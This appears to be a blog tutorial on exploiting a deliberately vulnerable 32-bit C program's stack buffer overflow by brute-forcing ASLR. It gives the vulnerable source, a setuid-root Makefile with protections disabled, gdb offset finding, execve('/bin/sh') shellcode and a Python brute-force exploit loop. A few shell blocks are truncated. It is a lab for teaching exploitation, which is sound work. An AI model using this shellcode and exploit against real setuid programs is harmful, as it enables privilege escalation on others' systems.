title: Exploiting Simple Buffer Overflow (2) --- Shellcode + ASLR Bruteforcing
comments: true
---

Hi! For my second article on exploiting simple buffer overflow, I want to talk about bruteforcing against ASLR (Address Space Layout Randomization). For those who are not so familiar with ASLR, it is a common countermeasure technique against traditional stack-based stack buffer overflow exploit--- it randomizes the memory address layout (e.g. stack) every time a program is run so that an attacker cannot know the exact location of shellcode/variable/etc beforehand.
It is enabled by default for most recent operation systems, and it is fairly effective for 64-bit systems (the range of randomization of address layout is 28-bit). However, for 32-bit systems, the range of randomization of address layout is so much smaller that bruteforcing is feasible.  
So, in this article, I will demonstrate a bruteforce against ASLR in 32-bit system, so that an arbitrary shellcode can be run. Note that other countermeasure techniques (e.g. DEP, Canary) are not used for the sake of simplicity in this experiment. (I promise that I will post about attacks against these techniques in the future!) Also, source code used in this article can be downloaded from [here](https://github.com/taishi8117/bof_lab/tree/master/bof).  

-------------------

I will use Ubuntu 14.04 32-bit for this experiment.  

```

And here is a simple vulnerable program that I will use. As you can see, `vuln()` function has a buffer overflow vulnerability when `strcpy` is called.  

```C
#include    <stdio.h>
#include    <stdlib.h>
#include    <assert.h>
#include	<string.h>


void vuln (const char* arg){
	char buffer[100];
	strcpy(buffer, arg);
	printf("Hello %s\n", buffer);
	printf("[+] buffer @ %p\n", buffer);
}

int main (int argc, char **argv){
	
	if (argc != 2) {
		printf("Usage: %s <buffer>\n", argv[0]);
		exit(1);
	}
	vuln(argv[1]);
		return 0;
}
```

And for Makefile, make sure that `-fno-stack-protector` and `-z execstack` are included in the flags.  

```
CC=gcc
CFLAGS=-std=c99 -Wall -fno-stack-protector -z execstack

all: bof

bof: bof.o
	$(CC) $(CFLAGS) -o $@ $^
	sudo chown 0:0 $@
	sudo chmod u+s $@

bof.o: bof.c

clean:
	rm bof.o bof
```

After it was compiled, make sure that ASLR is turned on.  

```
canopus@canopus:~/bof_lab/bof|master⚡

Okay, let's check how ASLR affects the address of buffer every time it is run.  

```
canopus@canopus:~/bof_lab/bof|master⚡
⇒  ./bof AAAA
Hello AAAA
[+] buffer @ 0xbfe9a8fc
canopus@canopus:~/bof_lab/bof|master⚡
⇒  ./bof AAAA
Hello AAAA
[+] buffer @ 0xbfb43e4c
canopus@canopus:~/bof_lab/bof|master⚡
⇒  ./bof AAAA
Hello AAAA
[+] buffer @ 0xbf8c941c
```

As you can see, the location of `buffer` is randomized every time the program is run, and it is impossible to guess its exact location for the next execution. However, if you examine the location of buffer repeatedly, you will realize that its location is within the range of `0xbf*****c`. In this case, there are 1048576 possible locations where buffer is loaded.  

Let's also examine how the program behaves when its buffer is overflowed.  

```
canopus@canopus:~/bof_lab/bof|master⚡
⇒  gdb -q ./bof
Reading symbols from ./bof...(no debugging symbols found)...done.
gdb-peda$ pattern_create 120
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'
gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA'

Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
[+] buffer @ 0xbf991ccc

Program received signal SIGSEGV, Segmentation fault.
(...)

gdb-peda$ pattern_search
Registers contain pattern buffer:
EIP+0 found at offset: 112		(<== offset: 112)
EBP+0 found at offset: 108
(...)

gdb-peda$ p $eip
$1 = (void (*)()) 0x41384141
```

As you can see, 4 bytes starting from 112th character in the input string will overwrite EIP.   

Now, we have everything that's needed to exploit this program. 


Let's also write a shellcode that executes '/bin/sh' so you can get a shell. I will not explain the details of how to write shellcode, but there are lots of resources on the web that you can find very useful.  

```Assembly
global _start

section .text

_start:
	xor eax, eax
	push eax

	push 0x68732f2f		;//sh
	push 0x6e69622f		;/bin
	mov ebx, esp		;moving the pointer to "/bin//sh" to ebx

	push eax			;push 0 (=eax)
	mov edx, esp		;moving 0 to edx

	push ebx
	mov ecx, esp		;moving the pointer to "/bin//sh" to ecx

	mov al, 11
	int 0x80			;execv syscall
```

This assembly code is assembled and converted to string as shown in the script below (stored in shellcode variable).

```Python
#!/usr/bin/python

import struct, sys, time
from subprocess import PIPE, Popen

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

bufsize = 100
offset = 12     #incl. saved ebp
nopsize = 4096

def prep_buffer(addr_buffer):
    buf = "A" * (bufsize+offset)
    buf += struct.pack("<I",(addr_buffer+bufsize+offset+4))
    buf += "\x90" * nopsize
    buf += shellcode
    return buf

def brute_aslr(buf):
    p = Popen(['./bof', buf]).wait()

if __name__ == '__main__':
    addr_buffer = 0xbf92b39c    # randomly decided
    buf = prep_buffer(addr_buffer)
    i = 0
    while True:
        print i
        brute_aslr(buf)
        i += 1
```
